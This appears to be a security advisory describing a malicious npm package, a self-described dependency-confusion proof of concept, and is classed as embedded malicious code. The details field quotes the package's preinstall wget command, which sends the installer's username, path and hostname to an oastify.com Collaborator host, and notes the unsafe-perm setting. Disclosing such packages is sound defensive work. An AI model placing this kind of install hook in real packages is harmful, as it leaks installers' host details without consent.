summary: Dependency-confusion PoC exfiltrates installer identity via preinstall hook to attacker-controlled Collaborator
details: package.json declares a preinstall lifecycle script that runs `wget --quiet "http://78dngdm3dhrrj8zgfm4es9m8bzhq5jt8.oastify.com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`, transmitting the installer's username, working directory, and hostname over plain HTTP to a Burp Collaborator (oastify.com) subdomain. This fires automatically on `npm install` with no user interaction. The package additionally sets `config.unsafe-perm: true`, forcing the preinstall hook to execute with elevated privileges when installed via sudo, and self-describes as a dependency-confusion proof-of-concept. Regardless of stated intent, any installer who pulls this package leaks host identity to the operator of the Collaborator subdomain.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
